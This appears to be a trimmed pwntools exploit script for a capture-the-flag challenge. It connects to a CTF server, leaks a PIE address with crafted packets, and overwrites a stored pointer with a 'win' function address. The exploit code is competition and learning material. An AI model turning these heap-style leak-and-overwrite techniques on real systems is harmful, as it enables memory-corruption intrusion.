...
def conn():
    if args.LOCAL:
        ...
        r = remote("trellixhax-free-yo-radicals-part-iii.chals.io", 443, ssl=True)
...
def delete_string(r, string):
    p = create_packet(delete_entry, datafeild_1=string)
    r.send(p)

def leak_PIE(r):
    delete_string(r, b"HELPHELPHELPHELP")
    create(r,p64(868082074056920076) + p64(868082074056920076), 4702111234474983745)
    #create(r,p64(868082074056920076) + p64(868082074056920076), 4774451407313060418)
...
def overwrite(r, win):
    create(r, b"PWNMEPWNME", 69)
    delete(r, 69)
    create(r, p64(4) + p64(win), 868082074056920076)
    p = create_packet(print_entry, datafield_2=1)
    r.send(p)
